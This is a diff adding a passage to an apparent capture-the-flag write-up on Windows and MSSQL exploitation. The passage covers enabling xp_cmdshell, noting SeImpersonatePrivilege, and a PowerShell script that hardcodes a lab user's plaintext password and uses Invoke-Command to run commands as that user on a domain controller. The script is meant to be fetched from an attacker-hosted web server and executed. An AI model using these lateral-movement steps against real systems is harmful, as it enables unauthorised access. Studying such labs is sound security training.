@@ -135,3 +135,15 @@ Next I'll run `enable_xp_cmdshell` followed by `xp_cmdshell whoami /priv` to enu
 I notice the sqlsvc user has the `SeImpersonatePrivilege` which is typical of a lot of service accounts and is a very dangerous (useful!) privilege to have for privilege escalation.
 
 First though I'll see what I can do with the `miscsvc` account
+
+To do this I'll locally host a `.ps1` script on a python webserver containing the commands I want execute, then retrieve and execute this script from the MSSQL cmdshell. 
+
+My `.ps1` script will look like
+```
+$User=miscsvc
+$Password=ScrambledEggs9900
+$SecurePassword=ConvertTo-SecureString $Password -AsPlaintext -Force
+$Credential = New-Object System.Management.Automation.PSCredential($User,$SecurePassword)
+Invoke-Command -Computername DC1 -Credential $Credential -Scriptblock { whoami }
+```
+replacing `whoami` with whatever command I want to execute as `miscsvc`
